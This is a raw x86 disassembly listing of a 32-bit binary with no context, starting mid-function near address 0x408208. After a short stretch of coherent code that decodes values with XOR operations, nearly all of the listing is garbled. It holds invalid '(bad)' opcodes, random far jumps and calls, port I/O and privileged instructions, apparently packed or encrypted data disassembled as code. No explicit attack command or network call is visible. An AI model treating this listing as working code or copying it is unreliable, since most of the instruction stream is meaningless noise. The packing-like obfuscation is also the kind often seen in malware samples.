  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	popa   
  408269:	mov    ah,0x3b
  40826b:	test   DWORD PTR [edi],esi
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082d9
  408275:	cwde   
  408276:	pop    ebx
  408277:	idiv   bh
  408279:	jecxz  0x40828b
  40827b:	mov    dl,cl
  40827d:	fiadd  WORD PTR [ecx]
  40827f:	cmp    BYTE PTR [edi+0x6ee63694],bl
  408285:	(bad)  
  408286:	lods   al,BYTE PTR ds:[esi]
  408287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408288:	clc    
  408289:	mov    ecx,0xb377f5fd
  40828e:	cs iret 
  408290:	mov    bh,0x65
  408292:	xchg   edx,eax
  408293:	xchg   ecx,eax
  408294:	xchg   esi,eax
  408295:	loop   0x4082b1
  408297:	out    dx,eax
  408298:	xchg   esp,eax
  408299:	adc    esi,DWORD PTR [edx-0x3c]
  40829c:	xor    eax,0x98bb84b5
  4082a1:	mov    dl,0xb5
  4082a3:	xchg   esp,eax
  4082a4:	adc    eax,0xfb19812f
  4082a9:	add    BYTE PTR [esi-0x29457697],0xaf
  4082b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082b1:	and    ah,al
  4082b3:	mov    ecx,0x773b561f
  4082b8:	mov    edx,0xdbf1940f
  4082bd:	stos   DWORD PTR es:[edi],eax
  4082be:	loop   0x408336
  4082c0:	imul   ecx,DWORD PTR [edi-0x22],0xd07678d3
  4082c7:	in     al,dx
  4082c8:	jb     0x4082f9
  4082ca:	scas   eax,DWORD PTR es:[edi]
  4082cb:	lods   eax,DWORD PTR ds:[esi]
  4082cc:	xchg   ebp,eax
  4082cd:	jl     0x408341
  4082cf:	add    BYTE PTR [ebx+0x5bfc5911],al
  4082d5:	int3   
  4082d6:	cs repz or edx,esp
  4082da:	bound  ebp,QWORD PTR [eax]
  4082dc:	cli    
  4082dd:	sub    al,BYTE PTR [edi+esi*8]
  4082e0:	adc    ebp,esp
  4082e2:	mov    ebx,0x7050c52f
  4082e7:	dec    DWORD PTR [edx+0x379c70f3]
  4082ed:	jne    0x40833c
  4082ef:	std    
  4082f0:	cmp    ah,BYTE PTR [esi]
  4082f2:	xor    BYTE PTR [ebx-0x70429d36],dl
  4082f8:	fs lock dec esp
  4082fb:	inc    ebx
  4082fc:	mov    ds:0x13266410,al
  408301:	or     BYTE PTR [ebx-0x47],dl
  408304:	(bad)  
  408305:	adc    BYTE PTR [edi-0x18012868],cl
  40830b:	sub    BYTE PTR [esi-0x23],al
  40830e:	pop    ds
  40830f:	jnp    0x408387
  408311:	test   eax,0xbf6f303
  408316:	cmc    
  408317:	fs jo  0x408387
  40831a:	inc    esi
  40831b:	(bad)  
  40831c:	std    
  40831d:	neg    WORD PTR [esi-0x3e]
  408321:	pop    edx
  408322:	fs mov ah,0x96
  408325:	pop    edi
  408326:	adc    esp,DWORD PTR [edi+0x34]
  408329:	jae    0x4082cd
  40832b:	rcr    ecx,1
  40832d:	aas    
  40832e:	call   0x8f55:0x496456cb
  408335:	jae    0x40839c
  408337:	ins    DWORD PTR es:[edi],dx
  408338:	outs   dx,BYTE PTR ds:[esi]
  408339:	mov    edx,0x5b2bc8f2
  40833e:	jmp    0x5568c04e
  408343:	jne    0x4082c8
  408345:	mov    ds:0x12311054,al
  40834a:	int    0xcb
  40834c:	push   edx
  40834d:	fild   WORD PTR [eax+edi*8-0x4f2e9a2f]
  408354:	mov    dl,0x6a
  408356:	cmp    al,0xae
  408358:	icebp  
  408359:	inc    eax
  40835a:	loop   0x408373
  40835c:	ins    DWORD PTR es:[edi],dx
  40835d:	sti    
  40835e:	popa   
  40835f:	push   eax
  408360:	lods   al,BYTE PTR fs:[esi]
  408362:	sub    al,0xa3
  408364:	ins    BYTE PTR es:[edi],dx
  408365:	push   ds
  408366:	pop    edx
  408367:	jno    0x408370
  408369:	jl     0x40831a
  40836b:	inc    BYTE PTR [edi-0x68]
  40836e:	out    0x39,al
  408370:	test   al,0x8a
  408372:	sbb    al,0x3c
  408374:	je     0x40837b
  408376:	jp     0x408348
  408378:	jbe    0x408365
  40837a:	push   ebx
  40837b:	ror    DWORD PTR [ebp+0x587dde4f],cl
  408381:	test   al,0x29
  408383:	(bad)  ds:0x37bdf949
  408389:	loop   0x4083bf
  40838b:	sub    DWORD PTR [edi+0x77cee3eb],ebp
  408391:	push   cs
  408392:	jl     0x4083f6
  408394:	xor    eax,0x780a73d6
  408399:	stc    
  40839a:	sub    eax,0xc9553582
  40839f:	mov    cl,0xc3
  4083a1:	pop    ebx
  4083a2:	fadd   st,st(6)
  4083a4:	leave  
  4083a5:	jo     0x4083e5
  4083a7:	dec    ecx
  4083a8:	loope  0x40834c
  4083aa:	lea    ebx,[edi-0x2e357617]
  4083b0:	test   DWORD PTR [edi+0x2b],esp
  4083b3:	sbb    eax,0x322c8673
  4083b8:	push   esp
  4083b9:	in     al,dx
  4083ba:	lahf   
  4083bb:	mov    dh,0x27
  4083bd:	hlt    
  4083be:	cmp    esp,ebx
  4083c0:	mov    ebx,0xf8bdac19
  4083c5:	dec    ecx
  4083c6:	inc    eax
  4083c7:	scas   al,BYTE PTR es:[edi]
  4083c8:	pop    ebp
  4083c9:	call   FWORD PTR [ecx+0x12]
  4083cc:	push   DWORD PTR [eax]
  4083ce:	sbb    BYTE PTR [esi],bl
  4083d0:	xchg   edi,eax
  4083d1:	bound  ebp,QWORD PTR [edi]
  4083d3:	jmp    0xce553f98
  4083d8:	or     cl,al
  4083da:	cmp    al,0x2c
  4083dc:	mov    ecx,0x27c6cb70
  4083e1:	jbe    0x4083b4
  4083e3:	shr    DWORD PTR [edx],cl
  4083e5:	mov    edx,0xf80bef09
  4083ea:	fcom   QWORD PTR ds:0x57ed283e
  4083f0:	cmc    
  4083f1:	xor    ch,BYTE PTR [edx-0x5a]
  4083f4:	mov    ecx,0xf3e77c37
  4083f9:	pop    esi
  4083fa:	or     BYTE PTR [eax],al
  4083fc:	imul   ebp,DWORD PTR [esi+ebx*4-0x3e],0x3e9db59b
  408404:	call   0xd5e6:0xb311ca52
  40840b:	pusha  
  40840c:	das    
  40840d:	test   edi,edi
  40840f:	in     al,dx
  408410:	cmp    BYTE PTR [edi+0x2498036e],dh
  408416:	out    dx,eax
  408417:	int3   
  408418:	pop    edi
  408419:	lods   al,BYTE PTR ds:[esi]
  40841a:	jmp    0xbc56:0x825f96d4
  408421:	sbb    edi,ebp
  408423:	lds    eax,FWORD PTR [edi-0x40]
  408426:	jne    0x408421
  408428:	repz and eax,0xa5742505
  40842e:	jl     0x4083c8
  408430:	bound  ebp,QWORD PTR [eax+0x70d6ba21]
  408436:	test   ebx,edx
  408438:	pop    ds
  408439:	lea    edi,[ecx-0x3a]
  40843c:	pop    es
  40843d:	scas   eax,DWORD PTR es:[edi]
  40843e:	int3   
  40843f:	xor    DWORD PTR [eax+0x31],ebp
  408442:	inc    esp
  408443:	sub    eax,0x10e21947
  408448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408449:	icebp  
  40844a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40844b:	and    ebx,DWORD PTR [ebp+ebp*8+0x5b]
  40844f:	xchg   ecx,eax
  408450:	je     0x40845f
  408452:	cmp    esi,edx
  408454:	mov    WORD PTR [esi],?
  408456:	add    edx,ebp
  408458:	stos   BYTE PTR es:[edi],al
  408459:	fistp  DWORD PTR [ebx+0x1b]
  40845c:	push   eax
  40845d:	and    eax,edi
  40845f:	or     dh,BYTE PTR [edi]
  408461:	xor    al,0x52
  408463:	mov    bh,0xe9
  408465:	(bad)  
  408467:	arpl   WORD PTR [ebp-0x4df7d50b],dx
  40846d:	sbb    DWORD PTR [ebp-0x231ea780],ecx
  408473:	push   esi
  408474:	add    bh,0x19
  408477:	clc    
  408478:	ja     0x408452
  40847a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847b:	pop    ss
  40847c:	nop
  40847d:	fsubr  QWORD PTR [ecx]
  40847f:	jmp    0xa8c7:0xb5d83f95
  408486:	jae    0x4084ff
  408488:	retf   
  408489:	cmp    al,0x9b
  40848b:	xchg   ecx,eax
  40848c:	cmp    edi,edx
  40848e:	add    BYTE PTR [edx-0x28],0xc1
  408492:	sub    dl,al
  408494:	repnz cmp eax,0x8206c265
  40849a:	pop    esi
  40849b:	outs   dx,BYTE PTR ds:[esi]
  40849c:	mov    eax,0xa0152bc8
  4084a1:	jmp    0xa5e5:0x44ffdb78
  4084a8:	jg     0x4084d9
  4084aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084ab:	push   ecx
  4084ac:	cmp    BYTE PTR [ebx-0x7fa85404],ah
  4084b2:	repnz add al,0x59
  4084b5:	or     eax,0xb261c7ed
  4084ba:	and    al,0x92
  4084bc:	aad    0xce
  4084be:	push   ebp
  4084bf:	jns    0x40845f
  4084c1:	sbb    eax,DWORD PTR [eax+0x3f]
  4084c4:	adc    DWORD PTR [edx-0x5d349a98],0xfffffffe
  4084cb:	sahf   
  4084cc:	iret   
  4084cd:	xor    bh,BYTE PTR [eax]
  4084cf:	in     al,0xdc
  4084d1:	cmc    
  4084d2:	in     al,0x33
  4084d4:	bound  esi,QWORD PTR [ecx]
  4084d6:	sbb    DWORD PTR [ebx+0x5141a452],eax
  4084dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084dd:	jp     0x408518
  4084df:	xchg   ebp,eax
  4084e0:	ins    BYTE PTR es:[edi],dx
  4084e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e2:	jmp    0x408471
  4084e4:	push   ebx
  4084e5:	retf   
  4084e6:	and    al,0xe
  4084e8:	hlt    
  4084e9:	cs sub al,0xce
  4084ec:	mov    bh,0x8b
  4084ee:	push   eax
  4084ef:	lahf   
  4084f0:	lds    eax,FWORD PTR [edi+0x7c]
  4084f3:	jge    0x4084af
  4084f5:	call   0x42aa:0xc6b64bfd
  4084fc:	jo     0x40853d
  4084fe:	push   0xc
  408500:	add    esp,ebx
  408502:	mov    ds:0xeb7efe0c,al
  408507:	loop   0x40851e
  408509:	push   ebp
  40850a:	cmc    
  40850b:	loope  0x4084f3
  40850d:	in     al,dx
  40850e:	mov    al,ds:0x9e7bb8b6
  408513:	es aad 0xee
  408516:	dec    esp
  408517:	mov    eax,ds:0x23e56ea
  40851c:	in     al,0xb8
  40851e:	pop    ss
  40851f:	jge    0x4084ee
  408521:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408523:	rdpmc  
  408525:	mov    ecx,0x13a45e15
  40852a:	cmp    eax,0xf9224d5
  40852f:	pop    ss
  408530:	in     al,0x74
  408532:	push   0xffffffac
  408534:	cs out 0x72,al
  408537:	stos   DWORD PTR es:[edi],eax
  408538:	jne    0x4084cd
  40853a:	sbb    al,0x54
  40853c:	adc    bl,BYTE PTR [edx]
  40853e:	inc    ebx
  40853f:	cli    
  408540:	pusha  
  408541:	ja     0x40858e
  408543:	pop    ss
  408544:	fist   DWORD PTR [esi+0x6]
  408547:	mov    ecx,0x8300bf57
  40854c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40854d:	or     eax,0x682eeb7a
  408552:	xchg   edx,eax
  408553:	and    ch,BYTE PTR [edi+0x52]
  408556:	cs push edi
  408558:	jmp    0x84b8:0x902bf49
  40855f:	xchg   edx,eax
  408560:	xchg   esi,eax
  408561:	mov    es,WORD PTR ds:[esp+ecx*2]
  408565:	jns    0x408554
  408567:	push   esi
  408568:	lds    edi,FWORD PTR [ebp+eax*1-0x6b97708f]
  40856f:	sahf   
  408570:	mov    bh,BYTE PTR [ecx-0x7d]
  408573:	int    0xbf
  408575:	gs hlt 
  408577:	or     DWORD PTR [edx+0x57],esi
  40857a:	scas   eax,DWORD PTR es:[edi]
  40857b:	sti    
  40857c:	enter  0x7eba,0x2
  408580:	or     eax,DWORD PTR [eax-0x7933164a]
  408586:	mov    esi,0xdd6a2cf7
  40858b:	and    BYTE PTR [ebp+0x2bb1fd5f],dh
  408591:	pusha  
  408592:	mov    dh,0x40
  408594:	mov    esp,0x866bf0bc
  408599:	outs   dx,BYTE PTR ds:[esi]
  40859a:	and    al,0xb4
  40859c:	jle    0x4085e2
  40859e:	bound  eax,QWORD PTR ds:0xee6c198f
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xef83990a
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085de
  4085c4:	test   eax,0x5ca8cbb7
  4085c9:	pop    esi
  4085ca:	stc    
  4085cb:	ror    DWORD PTR [edi+0x15bcb17e],1
  4085d1:	pushf  
  4085d2:	add    dl,BYTE PTR [esi+0x4fbe7fea]
  4085d8:	mov    ds:0x45c2c97e,eax
  4085dd:	add    esp,DWORD PTR [ecx+edx*2-0x23e54f11]
  4085e4:	inc    esp
  4085e5:	push   ecx
  4085e6:	pop    edi
  4085e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085e8:	jl     0x4085f4
  4085ea:	fidiv  DWORD PTR [eax]
  4085ec:	lock adc BYTE PTR [edx],ch
  4085ef:	scas   al,BYTE PTR es:[edi]
  4085f0:	jbe    0x408598
  4085f2:	scas   al,BYTE PTR es:[edi]
  4085f3:	add    eax,DWORD PTR [ecx+eiz*4]
  4085f6:	xlat   BYTE PTR ds:[ebx]
  4085f7:	test   eax,0x3388efc0
  4085fc:	or     ch,dh
  4085fe:	mov    eax,ds:0xcf05dbfa
  408603:	xchg   ebx,eax
  408604:	inc    esp
  408605:	inc    ebp
  408606:	push   ds
  408607:	push   ebp
  408608:	push   bx
  40860a:	dec    esp
  40860b:	xchg   ebx,eax
  40860c:	adc    ah,al
  40860e:	ficom  DWORD PTR [edi+0x286e8be]
  408614:	es pop eax
  408616:	mov    ecx,0xb1456d45
  40861b:	pop    es
  40861c:	in     al,0xe2
  40861e:	pop    ds
  40861f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408620:	imul   ebp,DWORD PTR [edx],0x4e7b6fe
  408626:	je     0x408637
  408628:	jecxz  0x40866f
  40862a:	call   0x8c16a16a
  40862f:	push   ds
  408630:	test   BYTE PTR [edx-0x1c],bl
  408633:	scas   eax,DWORD PTR es:[edi]
  408634:	and    al,0x2c
  408636:	sbb    BYTE PTR ds:0x65893f73,dl
  40863c:	and    BYTE PTR [ecx-0x54532461],ch
  408642:	jmp    0xe130:0xafb8ece7
  408649:	imul   ebx,DWORD PTR [eax+0xb3c0e54],0xffffffd2
  408650:	les    esi,FWORD PTR [esi+0x4a]
  408653:	neg    BYTE PTR [ecx]
  408655:	pushf  
  408656:	sub    cl,BYTE PTR [ecx+0x14]
  408659:	jg     0x4085e3
  40865b:	add    al,0xe0
  40865d:	and    al,0x1e
  40865f:	xor    eax,0x5baab8b5
  408664:	fst    QWORD PTR [ecx+0x33]
  408667:	jg     0x4085ed
  408669:	xlat   BYTE PTR ds:[ebx]
  40866a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866b:	push   edx
  40866c:	imul   esp,DWORD PTR [esi],0xd5378db
  408672:	add    edx,DWORD PTR [edi]
  408674:	jmp    0x633c937e
  408679:	push   es
  40867a:	lods   al,BYTE PTR ds:[esi]
  40867b:	je     0x408636
  40867d:	mov    ah,0xe7
  40867f:	sbb    al,0xa0
  408681:	pop    edi
  408682:	ret    0x2a0
  408685:	ret    0xdbb3
  408688:	sbb    ebx,DWORD PTR [edx+eiz*4-0x707db1a9]
  40868f:	mov    edx,DWORD PTR [esi+eax*1]
  408692:	lea    edx,[esi+eax*2]
  408695:	jno    0x408674
  408697:	test   DWORD PTR [edx+0xd],eax
  40869a:	shl    BYTE PTR [edx],0xbc
  40869d:	clc    
  40869e:	sbb    DWORD PTR [ebx-0x6d733128],ecx
  4086a4:	jae    0x40868f
  4086a6:	retf   
  4086a7:	jno    0x40868a
  4086a9:	cmpxchg BYTE PTR [esi],ch
  4086ac:	shr    edx,1
  4086ae:	jb     0x4086fc
  4086b0:	push   ds
  4086b1:	pop    ebx
  4086b2:	cmp    dl,ch
  4086b4:	or     DWORD PTR [edx],eax
  4086b6:	and    DWORD PTR [edi-0x2780cc0d],0x6e
  4086bd:	ja     0x4086d4
  4086bf:	and    ebp,DWORD PTR [ebp+0x50]
  4086c2:	bound  ebp,QWORD PTR [edx+0x7442f480]
  4086c8:	push   cs
  4086c9:	icebp  
  4086ca:	pop    eax
  4086cb:	mov    esp,0xd15e50e1
  4086d0:	add    bh,cl
  4086d2:	cmc    
  4086d3:	dec    edi
  4086d4:	and    ebx,eax
  4086d6:	pusha  
  4086d7:	and    eax,0xc1ce8acc
  4086dc:	and    DWORD PTR [ecx],ecx
  4086de:	xchg   BYTE PTR [ecx],dl
  4086e0:	pop    ecx
  4086e1:	mov    edi,0x8e5ff861
  4086e6:	int    0xea
  4086e8:	stos   DWORD PTR es:[edi],eax
  4086e9:	adc    ecx,eax
  4086eb:	stc    
  4086ec:	and    DWORD PTR [ebx-0xf247cb3],0xffffff9e
  4086f3:	cs js  0x408686
  4086f6:	mov    ch,0x30
  4086f8:	mov    esp,0x158f5f85
  4086fd:	dec    esp
  4086fe:	jmp    0xef89:0xd8d41fc
  408705:	scas   eax,DWORD PTR es:[edi]
  408706:	out    0x78,eax
  408708:	jb     0x408730
  40870a:	std    
  40870b:	jl     0x40869c
  40870d:	xchg   ebp,eax
  40870e:	je     0x408768
  408710:	xchg   DWORD PTR [eax-0x4e5ba652],ecx
  408716:	aam    0x1b
  408718:	pop    edx
  408719:	sbb    ecx,DWORD PTR [ecx-0x6c075519]
  40871f:	ss push ecx
  408721:	sti    
  408722:	mov    dl,0x76
  408724:	stc    
  408725:	hlt    
  408726:	ret    
  408727:	outs   dx,BYTE PTR ds:[esi]
  408728:	(bad)  
  40872a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40872b:	pop    esp
  40872c:	in     al,dx
  40872d:	add    eax,0x9ec410c6
  408732:	and    DWORD PTR [edi-0x1b459c26],esi
  408738:	stc    
  408739:	pop    eax
  40873a:	std    
  40873b:	push   esi
  40873c:	mov    ecx,0xd51a357f
  408741:	rol    DWORD PTR [ecx+edx*4+0x47],cl
  408745:	xchg   edx,eax
  408746:	jle    0x40873c
  408748:	ret    0xf9c0
  40874b:	clc    
  40874c:	js     0x40877a
  40874e:	mov    dl,BYTE PTR [eax]
  408750:	sbb    eax,0x20425f6
  408755:	dec    ebx
  408756:	mov    ah,0xbb
  408758:	pop    edi
  408759:	fistp  WORD PTR [ebx]
  40875b:	adc    al,0x1d
  40875d:	mov    eax,0x9dbb6205
  408762:	mov    dl,0xed
  408764:	iret   
  408765:	pop    ds
  408766:	in     al,0xbb
  408768:	push   cs
  408769:	push   es
  40876a:	mov    ah,0x2e
  40876c:	cli    
  40876d:	scas   al,BYTE PTR es:[edi]
  40876e:	and    DWORD PTR [ebx-0x3b3c7fe2],esi
  408774:	pop    ebx
  408775:	arpl   WORD PTR [esi-0x97d604e],bx
  40877b:	retf   0x8f3f
  40877e:	test   DWORD PTR [ecx+0x24],ebx
  408781:	cmp    DWORD PTR [eax-0x1d],esi
  408784:	inc    esi
  408785:	push   ecx
  408786:	in     eax,dx
  408787:	ds (bad) 
  408789:	jne    0x408801
  40878b:	loopne 0x408806
  40878d:	jle    0x40870f
  40878f:	ins    DWORD PTR es:[edi],dx
  408790:	or     eax,0x54651ca8
  408795:	aad    0x74
  408797:	pusha  
  408798:	ret    
  408799:	jo     0x408797
  40879b:	test   cl,dl
  40879d:	pushf  
  40879e:	push   0x3e99a507
  4087a3:	imul   esp,ebp,0x302a3fdd
  4087a9:	retf   
  4087aa:	popf   
  4087ab:	lods   eax,DWORD PTR ds:[esi]
  4087ac:	ficom  DWORD PTR [esi+0x71d5f117]
  4087b2:	lea    ecx,[edi-0x33]
  4087b5:	xchg   esp,eax
  4087b6:	les    ecx,FWORD PTR [edx*1-0x2c21df90]
  4087bd:	cmp    BYTE PTR [edi],0xa6
  4087c0:	out    dx,al
  4087c1:	loopne 0x408787
  4087c3:	mov    WORD PTR [edx-0x12],ds
  4087c6:	dec    edi
  4087c7:	or     dl,BYTE PTR [ebp+0x44]
  4087ca:	push   0xffffffc7
  4087cc:	dec    edx
  4087cd:	(bad)  
  4087cf:	int    0xc6
  4087d1:	icebp  
  4087d2:	rcr    BYTE PTR [ebx-0x19c22c1f],1
  4087d8:	call   0xf66d:0x373a73b3
  4087df:	push   0xffffffbe
  4087e1:	test   dh,0xcf
  4087e4:	adc    edi,DWORD PTR [edi]
  4087e6:	fiadd  DWORD PTR [ebx+0x18b6bf86]
  4087ec:	adc    dh,cl
  4087ee:	add    al,0xf3
  4087f0:	and    BYTE PTR [edx+eax*1+0x181a7874],cl
  4087f7:	aam    0x22
  4087f9:	mov    eax,DWORD PTR ds:0xc27aba38
  4087ff:	xchg   ecx,eax
  408800:	stc    
  408801:	shl    BYTE PTR [ecx-0x2cd8e6d9],cl
  408807:	or     al,0x54
  408809:	dec    edi
  40880a:	cli    
  40880b:	adc    dl,0x5c
  40880e:	js     0x408830
  408810:	cmp    eax,0xc46c4710
  408815:	leave  
  408816:	popf   
  408817:	mov    eax,ds:0xe7f7b1bc
  40881c:	mov    ebp,0xe6e77a72
  408821:	pop    ecx
  408822:	dec    edi
  408823:	mov    edi,0x2fe23900
  408828:	add    eax,0xb4fd6d61
  40882d:	sub    al,0xc7
  40882f:	lahf   
  408830:	mov    eax,ds:0xfcdc8e6d
  408835:	mov    BYTE PTR [eax],bl
  408837:	retf   
  408838:	scas   eax,DWORD PTR es:[edi]
  408839:	retf   
  40883a:	pushf  
  40883b:	repz xchg esi,eax
  40883d:	xchg   ecx,eax
  40883e:	and    eax,0xe5f0226b
  408843:	fbstp  TBYTE PTR [ebp+0x324ddb16]
  408849:	loope  0x4087de
  40884b:	xchg   edi,eax
  40884c:	jb     0x4088ad
  40884e:	sbb    eax,0x4ae43c52
  408853:	push   cs
  408854:	imul   BYTE PTR [ecx-0x59]
  408857:	rcl    bl,0x65
  40885a:	jecxz  0x408841
  40885c:	cmp    al,0x3a
  40885e:	mov    bh,0x2b
  408860:	mov    edx,0x9c9a3101
  408865:	sub    BYTE PTR [ebp+0x2a2391c7],0x29
  40886c:	xchg   ebx,eax
  40886d:	in     eax,0x64
  40886f:	adc    ah,BYTE PTR ds:0x968d0182
  408875:	push   es
  408876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408877:	jl     0x408847
  408879:	add    bh,bl
  40887b:	inc    ebp
  40887c:	jmp    0x96ff:0x559b5b73
  408883:	lahf   
  408884:	stos   BYTE PTR es:[edi],al
  408885:	daa    
  408886:	xchg   DWORD PTR [esi-0x44],edx
  408889:	and    cl,BYTE PTR [ebx]
  40888b:	jmp    0xb81b1cf9
  408890:	inc    ecx
  408891:	or     DWORD PTR [ecx+0x53c86cf7],0x2650329d
  40889b:	pop    ecx
  40889c:	lods   al,BYTE PTR ds:[esi]
  40889d:	daa    
  40889e:	inc    ecx
  40889f:	add    eax,0x560b7a44
  4088a4:	ret    
  4088a5:	or     al,0x1e
  4088a7:	xchg   edx,eax
  4088a8:	mov    eax,DWORD PTR [ecx+0x357e2be8]
  4088ae:	sbb    bh,BYTE PTR [ebx]
  4088b0:	fcmovu st,st(3)
  4088b2:	mov    cs,WORD PTR [esi+0x7f0eae69]
  4088b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b9:	mov    al,ds:0xaf4bbea7
  4088be:	mov    ds,WORD PTR [ebx+ebx*2+0x30]
  4088c2:	ds (bad) 
  4088c4:	cmp    eax,0x3e6a942e
  4088c9:	cli    
  4088ca:	pushf  
  4088cb:	adc    al,0xc4
  4088cd:	pop    ebp
  4088ce:	in     eax,dx
  4088cf:	pop    ds
  4088d0:	adc    al,ah
  4088d2:	add    al,0xbb
  4088d4:	pop    ecx
  4088d5:	lods   eax,DWORD PTR ds:[esi]
  4088d6:	call   0x10e29451
  4088db:	mov    bl,0x87
  4088dd:	fidiv  DWORD PTR [ebx-0x165878e]
  4088e3:	and    edx,DWORD PTR [ebp+0x53]
  4088e6:	push   cs
  4088e7:	push   ss
  4088e8:	add    DWORD PTR [esi+ecx*4+0x33a5aaf],edx
  4088ef:	repz dec ebp
  4088f1:	loopne 0x408892
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0xcbca301],cl
  40890c:	out    0x7b,al
  40890e:	test   al,0x97
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x40895b
  408918:	out    dx,eax
  408919:	push   ebp
  40891a:	pusha  
  40891b:	fisubr DWORD PTR [eax+0x1595082d]
  408921:	push   ebx
  408922:	push   ebx
  408923:	push   0x40740e23
  408928:	sbb    DWORD PTR [edx+edi*4],edi
  40892b:	sti    
  40892c:	mov    ebx,0xf3462ccc
  408931:	jecxz  0x40898c
  408933:	imul   esi,ecx,0xffffffeb
  408936:	xor    al,0x54
  408938:	(bad)  
  408939:	in     eax,dx
  40893a:	jo     0x40891d
  40893c:	nop
  40893d:	push   esi
  40893e:	inc    esi
  40893f:	mov    bl,ch
  408941:	je     0x4088e3
  408943:	cmc    
  408944:	inc    ecx
  408945:	out    dx,al
  408946:	push   0x67f557a1
  40894b:	iret   
  40894c:	mov    ah,0x75
  40894e:	or     al,0x42
  408950:	cli    
  408951:	mov    esi,0x2d51fdae
  408956:	xchg   esi,eax
  408957:	add    al,0x12
  408959:	mov    dl,0xd4
  40895b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40895c:	outs   dx,DWORD PTR ds:[esi]
  40895d:	lahf   
  40895e:	stc    
  40895f:	dec    esi
  408960:	(bad)  
  408961:	imul   dh
  408963:	aas    
  408964:	cwde   
  408965:	jmp    0xca1bdb26
  40896a:	push   esp
  40896b:	stos   DWORD PTR es:[edi],eax
  40896c:	scas   al,BYTE PTR es:[edi]
  40896d:	in     eax,0xcd
  40896f:	imul   edx,DWORD PTR [ecx+0x560b9aab],0xbc6d68de
  408979:	pop    ds
  40897a:	lock mov esi,0x1107f088
  408980:	test   esi,edx
  408982:	popa   
  408983:	xor    al,0xba
  408985:	cld    
  408986:	mov    ch,BYTE PTR [edi]
  408988:	sub    al,0x9e
  40898a:	mov    bh,0x76
  40898c:	xor    eax,0xfd0ceb83
  408991:	sub    eax,0x842f8d2d
  408996:	jns    0x408930
  408998:	adc    dh,dh
  40899a:	cmp    ah,ah
  40899c:	xchg   ebp,eax
  40899d:	adc    DWORD PTR [edi+0xf],ebp
  4089a0:	and    dh,cl
  4089a2:	mov    ebx,0x218751b7
  4089a7:	ret    
  4089a8:	xor    BYTE PTR [edi-0x4ad8039e],0xfc
  4089af:	stos   DWORD PTR es:[edi],eax
  4089b0:	sbb    esi,DWORD PTR [edi-0x726ec923]
  4089b6:	adc    al,0x8c
  4089b8:	out    0xd4,al
  4089ba:	ret    
  4089bb:	xor    BYTE PTR [eax+0x18d99f1d],ah
  4089c1:	lods   al,BYTE PTR ds:[esi]
  4089c2:	sbb    al,BYTE PTR [ebp+0x6d55bde5]
  4089c8:	(bad)  
  4089c9:	aad    0x65
  4089cb:	(bad)  
  4089cc:	push   edi
  4089cd:	push   edx
  4089ce:	rcl    BYTE PTR [esi-0x7f],1
  4089d1:	lods   al,BYTE PTR ds:[esi]
  4089d2:	imul   eax,DWORD PTR [ecx+0x67],0xe186740f
  4089d9:	push   0x15
  4089db:	ret    
  4089dc:	jg     0x4089f8
  4089de:	scas   eax,DWORD PTR es:[edi]
  4089df:	mov    esi,0xbdc902b
  4089e4:	or     edx,DWORD PTR [ebx-0x66332e6c]
  4089ea:	shl    BYTE PTR [ebx+0x21b62b62],0x9f
  4089f1:	imul   eax,DWORD PTR [esi+0x48],0x5f
